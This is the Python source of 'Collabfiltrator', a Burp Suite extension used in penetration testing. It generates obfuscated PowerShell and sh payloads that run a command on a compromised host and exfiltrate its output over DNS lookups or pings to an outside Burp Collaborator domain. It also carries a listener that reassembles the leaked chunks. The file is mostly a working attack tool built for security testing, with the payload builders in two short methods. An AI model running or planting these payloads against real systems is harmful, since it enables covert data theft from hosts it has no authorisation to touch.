#Import Burp Objects
from burp import IBurpExtender, IBurpExtenderCallbacks, ITab, IBurpCollaboratorInteraction
#Import Java GUI Objects
from java.awt import Dimension, FlowLayout, Color, Toolkit
from java.awt.datatransfer import Clipboard, StringSelection
from javax import swing
from thread import start_new_thread
import sys, time, threading, base64
try:
    from exceptions_fix import FixBurpExceptions
except ImportError:
    pass

t = "" # declare thread globally so we can stop it from any function
stopThreads = False # Thread Tracker to prevent dangling threads
exfilFormat = "base64" #Valid Formats: base64, hex

class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExtenderCallbacks):
    # Extention information
    EXT_NAME = "Collabfiltrator"
    EXT_DESC = "Exfiltrate blind remote code execution output over DNS via Burp Collaborator."
    EXT_AUTHOR = "Adam Logue, Frank Scarpella, Jared McLaren, Ryan Griffin"
    EXT_VERSION = "2.1"
    # Output info to the Extensions console and register Burp API functions
    def registerExtenderCallbacks(self, callbacks):
        print ("Name: \t\t"      + BurpExtender.EXT_NAME)
        print ("Description: \t" + BurpExtender.EXT_DESC)
        print ("Authors: \t"      + BurpExtender.EXT_AUTHOR)
        print ("Version: \t" + BurpExtender.EXT_VERSION + "\n")
        # Required for easier debugging:
        # https://github.com/securityMB/burp-exceptions
        sys.stdout = callbacks.getStdout()
        self._callbacks = callbacks
        self._helpers   = callbacks.getHelpers()
        callbacks.setExtensionName(BurpExtender.EXT_NAME)

        self.killDanglingThreadsOnUnload = callbacks.registerExtensionStateListener(self.killDanglingThreads)


        #Create Burp Collaborator Instance
        self.burpCollab  = self._callbacks.createBurpCollaboratorClientContext()
        self.collaboratorDomain = self.burpCollab.generatePayload(True)

        #Create panels used for layout; we must stack and layer to get the desired GUI
        self.tab = swing.Box(swing.BoxLayout.Y_AXIS)
        self.tabbedPane  = swing.JTabbedPane()
        self.tab.add(self.tabbedPane)
        
        # First tab
        self.collabfiltratorTab   = swing.Box(swing.BoxLayout.Y_AXIS)
        self.tabbedPane.addTab("Collabfiltrator", self.collabfiltratorTab)
        
        # Second tab
        #self.configurationTab = swing.Box(swing.BoxLayout.Y_AXIS)
        #self.tabbedPane.addTab("Configuration", self.configurationTab)
        
        # Create objects for the first tab's GUI
        # These rows will add top to bottom on the Y Axis
        self.t1r1 = swing.JPanel(FlowLayout()) # title and description frame
        self.t1r2 = swing.JPanel(FlowLayout()) #platform and command box frame
        self.t1r3 = swing.JPanel(FlowLayout()) #payload box frame
        self.t1r5 = swing.JPanel(FlowLayout()) #copy payload to clipboard frame
        self.t1r7 = swing.JPanel(FlowLayout()) #output box frame
        self.t1r4 = swing.JPanel(FlowLayout()) # collaborator domainname frame
        self.t1r6 = swing.JPanel(FlowLayout()) # hidden stop listener frame that only appears upon payload generation
        self.t1r8 = swing.JPanel(FlowLayout()) #clearOutput box frame

        # Now add content to the first tab's GUI objects
        self.osComboBox = swing.JComboBox(["Windows PowerShell", "Linux (sh + ping)"])
        self.commandTxt = swing.JTextField("hostname", 35)
        #self.commandTxt = swing.JTextField("dir c:\inetpub\wwwroot", 35)
        self.payloadTxt = swing.JTextArea(10,55)
        self.payloadTxt.setEditable(False)# So you can't messup the generated payload
        self.payloadTxt.setLineWrap(True) #Wordwrap the output of payload box
        self.outputTxt = swing.JTextArea(10,55)
        self.outputScroll = swing.JScrollPane(self.outputTxt) # Make the output scrollable
        self.payloadScroll = swing.JScrollPane(self.payloadTxt) # Make the payloadText scrollable

        self.progressBar = swing.JProgressBar(5,15)
        self.progressBar.setVisible(False) # Progressbar is hiding

        self.outputTxt.setEditable(False)
        self.outputTxt.setLineWrap(True)
        self.burpCollaboratorDomainTxt = swing.JTextPane() # burp collaboratorTextPane
        self.burpCollaboratorDomainTxt.setText(" ") #burp collaborator domain goes here
        self.burpCollaboratorDomainTxt.setEditable(False)
        self.burpCollaboratorDomainTxt.setBackground(None)
        self.burpCollaboratorDomainTxt.setBorder(None)
        self.t1r1.add(swing.JLabel("<html><center><h2>Collabfiltrator</h2>Exfiltrate blind remote code execution output over DNS via Burp Collaborator.</center></html>"))
        self.t1r2.add(swing.JLabel("Platform"))
        self.t1r2.add(self.osComboBox)
        self.t1r2.add(swing.JLabel("Command"))
        self.t1r2.add(self.commandTxt)
        self.t1r2.add(swing.JButton("Execute", actionPerformed=self.executePayload))
        self.t1r3.add(swing.JLabel("Payload"))
        self.t1r3.add(self.payloadScroll)        
        self.t1r4.add(self.burpCollaboratorDomainTxt) #burp Collab Domain will go here
        self.t1r5.add(swing.JButton("Copy Payload to Clipboard", actionPerformed=self.copyToClipboard))
        self.t1r6.add(self.progressBar)
        self.stopListenerButton = swing.JButton("Stop Listener", actionPerformed=self.stopListener)
        self.stopListenerButton.setVisible(False) # hide stopListenerButton
        self.t1r6.add(self.stopListenerButton)
        self.t1r7.add(swing.JLabel("Output"))
        self.t1r7.add(self.outputScroll) #add output scroll bar to page
        self.t1r8.add(swing.JButton("Clear Output", actionPerformed=self.clearOutput))


        # Add the GUI objects into the first tab
        self.collabfiltratorTab.add(self.t1r1)
        self.collabfiltratorTab.add(self.t1r2)
        self.collabfiltratorTab.add(self.t1r3)
        self.collabfiltratorTab.add(self.t1r4)
        self.collabfiltratorTab.add(self.t1r5)
        self.collabfiltratorTab.add(self.t1r6)
        self.collabfiltratorTab.add(self.t1r7)
        self.collabfiltratorTab.add(self.t1r8)
        
        # Create objects for the second tab's GUI
        self.dummylabel = swing.JLabel("Burp Collaborator Config options will go here.")
        
        # Add the GUI objects into the second tab
        ########self.configurationTab.add(self.dummylabel)

        #Register the panel in the Burp GUI
        callbacks.addSuiteTab(self)
        return

    # Standard function: Set the tab name
    def getTabCaption(self):
        return BurpExtender.EXT_NAME

    # Standard function: Set the GUI component in the tab
    def getUiComponent(self):
        return self.tab

    def createShPingBase64Payload(self, linuxCommand):
        global exfilFormat
        exfilFormat = "hex"
        shCommand = linuxCommand + '''|od -A n -t x1|sed 's/ //g'|while read exfil;do ping -c1 `printf %04d $i`.$exfil.''' + self.collaboratorDomain + '''&let i=i+1;echo;done'''
        return "echo " + self._helpers.base64Encode(shCommand) + "|base64 -d|sh"

    # Create windows powershell base64 payload
    def createPowershellBase64Payload(self, windowsCommand):
        global exfilFormat
        exfilFormat = "base64"
        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","EQLS").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
        return "powershell -enc " + self._helpers.base64Encode(powershellCommand.encode("UTF-16-LE"))

    def killDanglingThreads(self):
        global stopThreads
        global t
        stopThreads = True
        try:
            t.join() #rejoin the thread so it detects the stopThreads and exits gracefully
        except:
            pass
        stopThreads = False #Reset the threadTracker so we can run it again
        return
    
    # return generated payload to payload text area
    def executePayload(self, event):
        self.killDanglingThreads()
        self.collaboratorDomain = self.burpCollab.generatePayload(True)#rerun to regenrate new collab domain
        burpCollabInstance = self.burpCollab
        domain = self.collaboratorDomain # show domain in UI
        self.burpCollaboratorDomainTxt.setText(domain)
        if self.osComboBox.getSelectedItem() == "Windows PowerShell":
            self.payloadTxt.setText(self.createPowershellBase64Payload(self.commandTxt.getText()))
        elif self.osComboBox.getSelectedItem() == "Linux (sh + ping)":
            self.payloadTxt.setText(self.createShPingBase64Payload(self.commandTxt.getText()))
        self.checkCollabDomainStatusWrapper(domain, burpCollabInstance )
        return

    def stopListener(self, event): #killDanglingThreads, but as a buttonEvent
        self.killDanglingThreads()
        self.payloadTxt.setText("")
        return

    def clearOutput(self, event): 
        self.outputTxt.setText("") #clear out output text because button was clicked     
        return  

    def checkCollabDomainStatusWrapper(self, domain, burpCollab):
        global stopThreads
        threadFinished = False
        global t
        t = threading.Thread(target=self.checkCollabDomainStatus, args=(domain, burpCollab)) #comma has to be here even with only 1 arg because it expects a tuple
        t.start()
        return # thread doesn't stop locking in execute button

    #copy generated payload to clipboard
    def copyToClipboard(self, event):
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        data = StringSelection(self.payloadTxt.getText())
        clipboard.setContents(data, None)
        return    

    #monitor collab domain for output response
    def checkCollabDomainStatus(self, domain, objCollab):
        DNSrecordDict = dict()#since data comes in out of order we have to line up each request with it's timestamp
        #recordType = "A" #01
        complete = False
        #recordType = "AAAA" #1C or int(28)
        #recordType = "MX" #00 ?
        sameCounter = 0 #if this gets to 5, it means our data chunks coming in have been the same for 5 iterations and no new chunks are coming in so we can end the while loop.

        global stopThreads
        while (stopThreads == False):
            if stopThreads == True:
                self.progressBar.setVisible(False) #stop progress bar
                self.t1r6.setVisible(False) # hide progressbar
                self.stopListenerButton.setVisible(False) # hide stopListenerButton
                stopThreads = False # reset StopThreads
                break
            self.progressBar.setVisible(True) #show progress bar
            self.progressBar.setIndeterminate(True) #make progress bar show listener is running
            self.stopListenerButton.setVisible(True) # show stopListenerButton
            check = objCollab.fetchCollaboratorInteractionsFor(domain)
            oldkeys = DNSrecordDict.keys()

            for i in range(0, len(check)):
                dnsQuery = self._helpers.base64Decode(check[i].getProperty('raw_query'))
                preambleOffset = int(dnsQuery[12]) #Offset in dns query where preamble starts (0000,0001,0002,0003....)
                base64EncodedDataChunkOffset = int(dnsQuery[17]) #Offset in dns query where base64 encoded output data starts
                base64EncodedDataChunk = ''.join(chr (x) for x in dnsQuery[18:(18+base64EncodedDataChunkOffset)]) #Base64 encoded output data chunk
                preambleNumber = ''.join(chr (x) for x in dnsQuery[13:(13+preambleOffset)])
                DNSrecordDict[preambleNumber] = base64EncodedDataChunk #line up preamble with base64EncodedDataChunk containing data

            keys = DNSrecordDict.keys()

            ### Check if input stream is done.
            if keys == oldkeys and keys != []:
                sameCounter += 1
            elif keys != oldkeys and keys != []:
                sameCounter = 0
            if sameCounter == 5: #if the data is the same 5 times then no more nslookups are coming in
                stopThreads = True

        self.progressBar.setVisible(False) # hide progressbar
        self.progressBar.setIndeterminate(False) #turn off progressbar
        self.stopListenerButton.setVisible(False) # hide stopListenerButton


        output = showOutput(DNSrecordDict)
        

        self.outputTxt.append("Command: " +self.commandTxt.getText() + "\n\n"  + output + "\n\n") #print output to payload box
        print ("Collaborator Domain: " + domain) # Output in Extender Tab
        print ("Command: " + self.commandTxt.getText() ) # Output in Extender Tab
        print ("Output: \n" + output + "\n") # Output in Extender Tab
        self.outputTxt.setCaretPosition(self.outputTxt.getDocument().getLength()) # make sure scrollbar is pointing to bottom
        self.payloadTxt.setText("") #clear out payload box because listener has stopped     
        return


def showOutput(outputDict): #This has to be on the outside the BurpExtender class or it won't trigger.
    completedInputString = ""
    for chunk in (sorted(outputDict.items())): #Sort by preamble number to put data in order 
        completedInputString += chunk[1] # DNSrecordDict.items() returns a tuple so take value from the dict and append it to completedInputString
    if exfilFormat == "base64":
        output = completedInputString.replace('EQLS','=').replace('PLUS','+') # drop EOF marker and replace any - padding with = and fix PLUSes
        output = base64.b64decode(output)   #this works better than the native Burp base64decode for some reason 
        return output
    elif exfilFormat == "hex":
        output = completedInputString.decode('hex')
        return output


#Burp Error Debugging
'''
try:
    FixBurpExceptions()
except:
    pass
'''